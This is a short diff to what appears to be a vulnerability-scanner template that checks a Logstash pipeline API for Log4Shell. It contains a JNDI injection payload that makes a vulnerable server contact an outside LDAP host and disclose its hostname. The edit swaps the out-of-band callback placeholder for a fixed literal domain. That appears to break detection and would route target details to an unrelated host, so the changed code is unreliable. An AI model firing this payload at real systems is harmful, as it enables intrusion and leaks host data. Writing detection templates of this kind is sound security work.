@@ -28,7 +28,7 @@ variables:
 http:
   - raw:
       - |
-        GET /api/logstash/pipeline/${jndi:ldap://${:-{{rand1}}}${:-{{rand2}}}.${hostName}.username.{{interactsh-url}}/{{str}}} HTTP/1.1
+        GET /api/logstash/pipeline/${jndi:ldap://${:-{{rand1}}}${:-{{rand2}}}.${hostName}.username.interactsh-url.com/{{str}}} HTTP/1.1
         Host: {{Hostname}}
         Referrer: {{RootURL}}/app/management/ingest/pipelines/
         Content-Type: application/json
